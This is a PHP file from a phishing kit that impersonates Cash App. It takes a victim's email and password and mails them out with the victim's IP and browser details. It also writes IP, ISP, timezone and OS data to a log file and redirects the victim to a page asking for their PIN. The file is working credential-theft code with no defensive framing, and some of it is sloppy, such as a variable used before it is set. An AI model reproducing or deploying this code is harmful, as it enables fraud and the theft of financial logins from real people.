<?php
session_start();



if(isset($_SESSION['ssn'])) {
    echo "<script>window.location = 'https://www.cash.app';</script>";
    exit();
}

if(isset($_SESSION['oauth'])) {
    echo "<script>window.location = '{$_SESSION['redirect']}';</script>";
    exit();
}

if(isset($_POST['submit'])) {
    
    $email    = $_SESSION['email'];
    $password = $_POST['password'];

}
?>

     <?php $mail = $_SESSION['email'];
$pw= $_POST['password'];
$message   = "

====[ Cashapp Login Email ]====

• Email :  ".$mail."
• Password  : ".$pw."


====[ INFO DEVICE ]====

• IP Info   :  ".$ip." On ".gmdate('r')."
• IP Lookup : https://ip-api.com/".$ip."
• Browser   :  ".$_SERVER['HTTP_USER_AGENT']." 

=======♤♤♤[ Result  Cashapp]♤♤♤=======




";


include '../email.php';
$subject = "Cashapp Email Login [ ".$mail." ]";
$headers = "From:Cashapp Email Login <imanhalal@love.com>";
mail($email, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r")); 
///GET INFO\\\
function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
function getOS() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$BROWSER = $_SERVER['HTTP_USER_AGENT'];
$result  = "Unknown";

if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}

///GET INFO DONE\\\


///POST INFO\\\

$IP_LOOKUP           = @json_decode(file_get_contents("http://ip-api.com/json/".$_SESSION['_ip_']));
$LOOKUP_TIMEZONE     = $IP_LOOKUP->timezone ."";
$LOOKUP_ISP          = $IP_LOOKUP->isp ."";
$LOOKUP_BROWSER      = getBrowser();
$LOOKUP_OS           =   getOS()."\r\n";;

$_SESSION['_LOOKUP_TIMEZONE_'] = $LOOKUP_TIMEZONE;
$_SESSION['_LOOKUP_ISP_']   = $LOOKUP_ISP;




$log = fopen("../email_login.txt", "a") or die("Unable to open file!");
fwrite($log, "| $LOOKUP_TIMEZONE | $ip | $LOOKUP_ISP | $LOOKUP_BROWSER | $LOOKUP_OS");
fclose($log);

///POST INFO DONE\\\
?>
<script>window.location.replace("/confirm/pin")</script>';}
}